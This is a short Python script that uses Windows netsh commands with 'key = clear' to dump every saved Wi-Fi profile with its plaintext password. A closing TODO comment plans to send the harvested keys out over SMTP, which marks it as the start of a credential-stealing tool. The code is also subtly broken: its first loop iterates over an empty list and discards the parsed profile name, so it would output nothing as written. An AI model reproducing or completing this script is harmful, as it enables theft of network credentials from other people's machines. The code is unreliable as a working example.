#!/usr/bin/env python3

import subprocess

# gets the metadata
meta = subprocess.check_output(["netsh", "wlan", "show", "profiles"])


# meta data need to be in utf 8 format
decoded_meta = meta.decode("utf-8").split("\n")



# itrating through each ssid and appending them in list
profiles = []
for profile in profiles:
	if "All User Profile" in profile:
		profile.split(":")[1][1:-1]
		profiles.append(profile)




print ("{:<30}| {:<}".format("SSID :", "Key "))
print ("\n")



# itrate through each profile and set the key to clear pass and boom boom chaw
for profile in profiles:
	try:
		res = subprocess.check_output(['netsh' ,'wlan' , 'show', 'profile', profile, 'key = clear']).decode('utf-8', errors="backslashreplace").split('\n')
		
		res = [b.split(":")[1][1:-1] for b in res if "Key Content" in b]
		
		try:
		
			print ("{:<30}| {:<}".format(profile, res[0]))
		
		except:
			print ("{:<30}|{:<}".format(profile, ""))
	except subprocess.CalledProcessError as e:
		print("exeption occured as : {}".format(e))
		


#TODO: send profiles and keys through smtp or some shit when SSH module is implemented
